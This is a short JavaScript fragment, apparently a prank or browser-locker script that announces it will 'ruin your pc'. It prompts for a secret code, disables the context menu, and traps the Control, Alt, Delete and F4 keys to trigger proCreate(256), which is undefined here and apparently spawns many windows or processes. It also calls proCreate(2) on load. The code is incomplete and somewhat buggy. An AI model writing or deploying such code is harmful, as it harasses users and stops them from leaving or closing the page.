window.onload = () => {this.n = prompt("Before you actually ruin your pc, this part is to test. Secret code?"); if (n != "genrandstr()") {playBall()} else null};
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key) & n != "genrandstr()") {
		await proCreate(256);
	}
	
	return null;
}
proCreate(2);
